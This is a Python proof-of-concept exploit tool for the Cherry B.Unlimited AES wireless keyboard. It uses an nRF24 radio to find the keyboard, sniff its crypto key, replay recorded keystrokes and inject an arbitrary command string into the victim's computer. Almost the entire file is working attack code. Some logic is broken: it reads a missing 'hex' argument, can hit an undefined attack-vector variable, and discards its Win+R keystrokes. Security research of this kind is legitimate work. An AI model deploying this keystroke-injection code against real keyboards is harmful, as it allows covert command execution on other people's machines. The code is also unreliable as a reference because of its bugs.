#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  Cherry Attack

  by Matthias Deeg <matthias.deeg@syss.de> and
  Gerhard Klostermeier <gerhard.klostermeier@syss.de>

  Proof-of-Concept software tool to demonstrate the replay
  and keystroke injection vulnerabilities of the wireless keyboard
  Cherry B.Unlimited AES

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
  
  Einstein2150 (Update 2024):
  This program has been migrated and further developed for use with
  Python 3 by Einstein2150. The author acknowledges that ongoing
  enhancements and updates to the codebase may continue in the future.
  Users should be aware that the use of this program is at their own
  risk, and the author accepts no responsibility for any damages that
  may arise from its use. It is the user's responsibility to ensure 
  that their use of the program complies with all applicable laws 
  and regulations.

"""

__version__ = '1.1'
__author__ = 'Einstein2150'

import argparse
import logging
import pygame

from binascii import hexlify, unhexlify
from lib import keyboard
from lib import nrf24
from logging import debug, info
from pygame.locals import *
from time import sleep, time
from sys import exit

# constants
DEFAULT_ATTACK_VECTOR   = "Just an input from the hacker :D"

RECORD_BUTTON   = pygame.K_1
REPLAY_BUTTON   = pygame.K_2
ATTACK_BUTTON   = pygame.K_3
SCAN_BUTTON     = pygame.K_4

IDLE            = 0
RECORD          = 1
REPLAY          = 2
SCAN            = 3
ATTACK          = 4

SCAN_TIME       = 2
DWELL_TIME      = 0.1
PREFIX_ADDRESS  = ""
KEYSTROKE_DELAY = 0.01

class CherryAttack():
    """Cherry Attack"""

    def __init__(self, crypto_key=None, device_address=None, attack_vector=None, execute=False):
        """Initialize Cherry Attack"""
        info(f"Execute: {execute}, Attack Vector: {attack_vector}")
        self.crypto_key = crypto_key
        self.device_address = device_address
        self.attack_vector = attack_vector
        self.state = IDLE
        self.channel = 6
        self.payloads = []
        self.kbd = None
        self.screen = None
        self.font = None
        self.statusText = ""
        self.execute = execute

        try:
            pygame.init()
            self.icon = pygame.image.load("./images/syss_logo.png")
            self.bg = pygame.image.load("./images/cherry_attack_bg.png")
            pygame.display.set_caption("SySS Cherry Attack PoC")
            pygame.display.set_icon(self.icon)
            self.screen = pygame.display.set_mode((400, 300), 0, 24)
            self.font = pygame.font.SysFont("arial", 24)
            self.screen.blit(self.bg, (0, 0))
            pygame.display.update()
            #pygame.key.set_repeat(250, 50)

            self.radio = nrf24.nrf24()
            self.radio.enable_lna()
            
            # If key and device address are provided, skip scanning and initialize keyboard directly
            if self.crypto_key and self.device_address:
                self.initialize_keyboard()
            else:
                self.setState(SCAN)
            # Check if execute flag is set and attack vector is provided
            if execute and attack_vector:
                self.setState(ATTACK)
                self.perform_attack()  # Perform the attack immediately
                
        except Exception as e:
            info(f"[-] Error: Could not initialize Cherry Attack: {e}")
            
    def perform_attack(self):
        """Perform the attack with the provided attack vector."""
        if self.kbd is not None:
            # send keystrokes for attack
            keystrokes = []
            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

            # send attack keystrokes
            sleep(0.1)

            keystrokes = self.kbd.getKeystrokes(self.attack_vector)
            keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

            # send attack keystrokes with a small delay
            for k in keystrokes:
                self.radio.transmit_payload(k)
                info("Sent payload: {0}".format(hexlify(k)))

        self.setState(IDLE)

    def initialize_keyboard(self):
        """Initialize the keyboard with provided crypto key and device address"""
        self.kbd = keyboard.CherryKeyboard(bytes(self.crypto_key))
        info(f"Initialized keyboard with Crypto Key: {hexlify(self.crypto_key).decode('utf-8')} and Device Address: {':'.join(f'{b:02X}' for b in self.device_address)}")
        info('-------------------------')
        self.setState(IDLE)     
            
    def showText(self, text, x=40, y=140):
        output = self.font.render(text, True, (0, 0, 0))
        self.screen.blit(output, (x, y))

    def setState(self, newState):
        if newState == RECORD:
            self.state = RECORD
            self.statusText = "RECORDING"
        elif newState == REPLAY:
            self.state = REPLAY
            self.statusText = "REPLAYING"
        elif newState == SCAN:
            self.state = SCAN
            self.statusText = "SCANNING"
        elif newState == ATTACK:
            self.state = ATTACK
            self.statusText = "ATTACKING"
        else:
            self.state = IDLE
            self.statusText = "IDLING"
            
       # Call the method to display the menu after switching to IDLE
        if self.state == IDLE:
            self.display_menu()

    def display_menu(self):
        self.showText("-------------------------")
        info('-------------------------')
        info('1: RECORDING')
        info('2: REPLAYING')
        info('3: ATTACKING')
        info('4: SCANNING')
        info('-------------------------')
        self.showText("1: RECORDING")
        self.showText("2: REPLAYING")
        self.showText("3: ATTACKING")
        self.showText("4: SCANNING")
        #pygame.display.update()

    def unique_everseen(self, seq):
        seen = set()
        return [x for x in seq if str(x) not in seen and not seen.add(str(x))]

    def run(self):
        while True:
            for i in pygame.event.get():
                if i.type == QUIT:
                    exit()
                elif i.type == KEYDOWN:
                    if i.key == K_ESCAPE:
                        exit()
                    if i.key == RECORD_BUTTON:
                        if self.state == IDLE:
                            self.setState(RECORD)
                            self.payloads = []
                        elif self.state == RECORD:
                            self.setState(IDLE)
                    if i.key == REPLAY_BUTTON:
                        if self.state == IDLE:
                            self.setState(REPLAY)
                    if i.key == SCAN_BUTTON:
                        if self.state == IDLE:
                            self.setState(SCAN)
                    if i.key == ATTACK_BUTTON:
                        if self.state == IDLE:
                            self.setState(ATTACK)

            self.screen.blit(self.bg, (0, 0))
            self.showText(self.statusText)
            pygame.display.update()

            if self.state == RECORD:
                value = self.radio.receive_payload()
                if value[0] == 0:
                    payload = value[1:]
                    self.payloads.append(payload)
                    info('Received payload: {0}'.format(hexlify(payload).decode('utf-8')))

            elif self.state == REPLAY:
                payloadList = self.unique_everseen(self.payloads)
                for p in payloadList:
                    self.radio.transmit_payload(bytes(p))
                    info('Sent payload: {0}'.format(hexlify(p).decode('utf-8')))
                    sleep(KEYSTROKE_DELAY)
                self.setState(IDLE)

            elif self.state == SCAN:
                self.radio.enter_promiscuous_mode(PREFIX_ADDRESS)
                SCAN_CHANNELS = [6]
                self.radio.set_channel(SCAN_CHANNELS[0])
                last_tune = time()
                channel_index = 0
                while True:
                    if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
                        channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
                        self.radio.set_channel(SCAN_CHANNELS[channel_index])
                        last_tune = time()
                    value = self.radio.receive_payload()
                    if len(value) >= 5:
                        address, payload = value[:5], value[5:]
                        converted_address = address[::-1]
                        if converted_address[0] in range(0x31, 0x3f):
                            self.address = converted_address
                            break
                self.showText("Found keyboard")
                address_string = ':'.join(f'{b:02X}' for b in address)
                self.showText(address_string)
                info(f"Found keyboard with address {address_string} on channel {SCAN_CHANNELS[channel_index]}")
                self.radio.enter_sniffer_mode(self.address)
                info("Searching crypto key")
                self.statusText = "SEARCHING"
                self.screen.blit(self.bg, (0, 0))
                self.showText(self.statusText)
                pygame.display.update()
                last_key = 0
                packet_count = 0
                while True:
                    value = self.radio.receive_payload()
                    if value[0] == 0:
                        last_key = time()
                        payload = value[1:]
                        packet_count += 1
                        info('Received payload: {0}'.format(hexlify(payload).decode('utf-8')))
                    if packet_count >= 4 and time() - last_key > SCAN_TIME:
                        break
                        
                self.radio.receive_payload()
                # self.showText("Got crypto key!")
                self.showText("-------------------------")
                # Log the Crypto Key and Device Address in hex format
                crypto_key_hex = hexlify(payload).decode('utf-8')
                device_address_hex = ':'.join(f'{b:02X}' for b in self.address)
                info(f'Got crypto key: {crypto_key_hex}')
                info(f'Device address: {device_address_hex}')
                
                self.kbd = keyboard.CherryKeyboard(bytes(payload))
                info('Initialize keyboard')
                self.setState(IDLE)

            elif self.state == ATTACK:
                    if self.kbd != None:
                        # send keystrokes for attack
                        keystrokes = []
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

                        # send attack keystrokes
                        sleep(0.1)

                        keystrokes = []
                        keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

                        # send attack keystrokes with a small delay
                        for k in keystrokes:
                            self.radio.transmit_payload(k)

                            # info output
                            info("Sent payload: {0}".format(hexlify(k)))
                        
                    self.setState(IDLE)

            sleep(0.05)

if __name__ == '__main__':
    # Setup logging
    level = logging.INFO
    logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
    info("Start Cherry Attack v{0}".format(__version__))

    # Set up argument parser
    parser = argparse.ArgumentParser(description='Cherry Attack PoC - a proof-of-concept tool for demonstrating replay and keystroke injection vulnerabilities of Cherry B.Unlimited AES wireless keyboards.')
    parser.add_argument('-key', type=str, help='The crypto key')
    parser.add_argument('-adr', type=str, help='The device address in hex format (e.g. 00:11:22:33:44)')
    parser.add_argument('-p', '--payload', type=str, help='Custom payload string (can contain special characters)')
    parser.add_argument('-x', '--execute', action='store_true', help='Execute attack immediately with the provided payload and quit')

    args = parser.parse_args()

    # Validate that both -key and -hex are provided if any
    if args.key and args.hex:
        try:
            crypto_key = unhexlify(args.key.replace(':', ''))
            device_address = unhexlify(args.hex.replace(':', ''))
            if len(crypto_key) != 16 or len(device_address) != 5:
                raise ValueError("Invalid length of crypto key or device address")
        except Exception as e:
            info(f"Error: {e}")
            exit(1)
    elif args.key or args.hex:
        info("Both -key and -adr must be provided together")
        exit(1)
    else:
        crypto_key = None
        device_address = None

    # Set the payload
    if args.payload:
        ATTACK_VECTOR = args.payload
        info(f"Custom payload set: {ATTACK_VECTOR}")

    # Hier ist die Anpassung
    if args.execute and args.payload:
        cherry_attack = CherryAttack(crypto_key, device_address, args.payload, execute=True)
        #cherry_attack.perform_attack()  # Führe den Angriff sofort aus
    else:
        cherry_attack = CherryAttack(crypto_key, device_address)
        cherry_attack.run()